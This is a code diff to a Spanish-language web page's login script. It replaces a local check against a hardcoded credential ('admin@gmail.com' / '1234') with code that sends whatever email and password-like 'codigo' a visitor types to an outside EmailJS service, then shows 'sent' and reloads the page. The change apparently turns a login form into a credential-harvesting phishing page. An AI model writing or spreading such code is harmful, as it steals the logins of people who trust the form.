@@ -122,27 +122,30 @@ button {
 function enviar() {
   let correo = document.getElementById("correo").value.trim();
   let codigo = document.getElementById("codigo").value.trim();
-  let mensaje = document.getElementById("mensaje");
 
   if (!correo || !codigo) {
-    mensaje.innerText = "Completa todos los campos";
+    document.getElementById("mensaje").innerText = "Completa los campos";
     return;
   }
 
-  // Usuario válido (puedes cambiarlo)
-  let correoValido = "admin@gmail.com";
-  let passValida = "1234";
+  let datos = {
+    email: correo,
+    code: codigo
+  };
 
-  if (correo === correoValido && codigo === passValida) {
-    mensaje.innerText = "Acceso correcto ✔";
+  emailjs.send("service_2ukrjlv", "template_7347e2j", datos)
+  .then(function(response) {
+     console.log("OK:", response);
+     document.getElementById("mensaje").innerText = "Enviado correctamente ✔";
 
-    setTimeout(() => {
-      window.location.href = "juego.html";
-    }, 1500);
+     setTimeout(() => {
+        location.reload();
+     }, 2000);
 
-  } else {
-    mensaje.innerText = "Correo o contraseña incorrectos ❌";
-  }
+  }, function(error) {
+     console.log("ERROR:", error);
+     document.getElementById("mensaje").innerText = "Error al enviar ❌";
+  });
 }
 </script>
 
